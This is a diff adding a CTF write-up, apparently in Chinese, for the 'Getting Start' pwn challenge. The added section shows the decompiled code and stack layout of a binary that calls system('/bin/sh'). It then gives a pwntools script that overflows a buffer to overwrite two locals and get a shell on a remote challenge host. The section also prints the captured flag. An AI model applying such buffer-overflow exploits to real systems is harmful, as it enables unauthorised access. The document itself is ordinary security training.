@@ -506,7 +506,7 @@ from pwn import *
 context(arch='amd64', os='linux', log_level='debug')
 io = remote('node4.buuoj.cn', 27036)
 # io = process('./2018_gettingStart')
-payload = b'a'*(0x30-0x18) + p64(0x7FFFFFFFFFFFFFFF) + p64(0x3FB999999999999A)
+payload = b'a'*0x18 + p64(0x7FFFFFFFFFFFFFFF) + p64(0x3FB999999999999A)
 io.sendlineafter(b'But Whether it starts depends on you.\n', payload)
 io.interactive()
 ```
@@ -2863,6 +2863,119 @@ io.interactive()
 ```
 
 ------
+
+### [Getting Start](https://ce.pwnthebox.com/challenges?id=1697)
+
+先`file ./task_gettingStart_ktQeERc  `查看文件类型，再`checksec --file=./task_gettingStart_ktQeERc  `检查文件保护情况。
+
+```bash
+┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnthebox]
+└─$ file ./task_gettingStart_ktQeERc
+./task_gettingStart_ktQeERc: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=8889abb24c5308b96e8483d5dbdd1aa67fffdaa4, stripped
+                                                                                                    
+┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnthebox]
+└─$ checksec --file=./task_gettingStart_ktQeERc
+[*] '/home/tyd/ctf/pwn/pwnthebox/task_gettingStart_ktQeERc'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+```
+
+用`IDA Pro 64bit`打开附件`2018_gettingstart`，按`F5`反汇编源码并查看主函数，可以看到有个`char`型数组`buf`，`buf`的可用栈大小为`0x30`，`read()`函数读取输入到`buf`变量时限制的字节数为`0x28`，双击`buf`变量可以查看栈结构。
+
+注意到当`v5 == 0x7FFFFFFFFFFFFFFFLL && v6 == 0.1`这个条件成立时就会发生系统调用`system('/bin/sh')`。
+
+```c
+__int64 __fastcall main(int a1, char **a2, char **a3)
+{
+  __int64 buf[3]; // [rsp+10h] [rbp-30h] BYREF
+  __int64 v5; // [rsp+28h] [rbp-18h]
+  double v6; // [rsp+30h] [rbp-10h]
+  unsigned __int64 v7; // [rsp+38h] [rbp-8h]
+
+  v7 = __readfsqword(0x28u);
+  buf[0] = 0LL;
+  buf[1] = 0LL;
+  buf[2] = 0LL;
+  v5 = 0x7FFFFFFFFFFFFFFFLL;
+  v6 = 1.797693134862316e308;
+  setvbuf(_bss_start, 0LL, 2, 0LL);
+  setvbuf(stdin, 0LL, 2, 0LL);
+  printf("HuWangBei CTF 2018 will be getting start after %lu seconds...\n", 0LL);
+  puts("But Whether it starts depends on you.");
+  read(0, buf, 0x28uLL);
+  if ( v5 == 0x7FFFFFFFFFFFFFFFLL && v6 == 0.1 )
+  {
+    printf("HuWangBei CTF 2018 will be getting start after %g seconds...\n", v6);
+    system("/bin/sh");
+  }
+  else
+  {
+    puts("Try again!");
+  }
+  return 0LL;
+}
+```
+
+分别双击`v5`和`v6`可以看到其在栈中的位置，构造`payload`时只需要将`v5`和`v6`重新赋值即可让主函数中的`if`条件成立。
+
+```assembly
+-0000000000000040 ; D/A/*   : change type (data/ascii/array)
+-0000000000000040 ; N       : rename
+-0000000000000040 ; U       : undefine
+-0000000000000040 ; Use data definition commands to create local variables and function arguments.
+-0000000000000040 ; Two special fields " r" and " s" represent return address and saved registers.
+-0000000000000040 ; Frame size: 40; Saved regs: 8; Purge: 0
+-0000000000000040 ;
+-0000000000000040
+-0000000000000040                 db ? ; undefined
+-000000000000003F                 db ? ; undefined
+-000000000000003E                 db ? ; undefined
+-000000000000003D                 db ? ; undefined
+-000000000000003C                 db ? ; undefined
+-000000000000003B                 db ? ; undefined
+-000000000000003A                 db ? ; undefined
+-0000000000000039                 db ? ; undefined
+-0000000000000038 var_38          dq ?
+-0000000000000030 buf             dq ?
+-0000000000000028 var_28          dq ?
+-0000000000000020 var_20          dq ?
+-0000000000000018 v5              dq ?
+-0000000000000010 v6              dq ?
+-0000000000000008 var_8           dq ?
++0000000000000000  s              db 8 dup(?)
++0000000000000008  r              db 8 dup(?)
++0000000000000010
++0000000000000010 ; end of stack variables
+```
+
+`v5`的赋值直接就是`0x7FFFFFFFFFFFFFFF`，那么`v6 == 0.1`该怎么样用`16`进制数表示呢？可以在这个网站https://www.binaryconvert.com/result_double.html查看`0.1`用`IEEE754`双精度浮点数中的二进制格式。
+
+![](https://paper.tanyaodan.com/BUUCTF/2018_gettingstart/4.png)
+
+当然也能在汇编源码中看到`ucomisd xmm0, cs:qword_C10`，双击`qword_C10`就能知道`0.1`在内存中的数值`0x3FB999999999999A`。
+
+![](https://paper.tanyaodan.com/BUUCTF/2018_gettingstart/5.png)
+
+编写`Python`代码即可得到`PTB{4c092b9f-0176-442b-8afc-fd587f7c4a91}`。
+
+```python
+from pwn import *
+
+context(arch='amd64', os='linux', log_level='debug')
+io = remote('redirect.do-not-trust.hacking.run', 10070)
+payload = b'a'*0x18 + p64(0x7FFFFFFFFFFFFFFF) + p64(0x3FB999999999999A)
+io.sendline(payload)
+io.interactive()
+```
+
+------
+
+
+
+
 
 ## Pwnable.kr
 
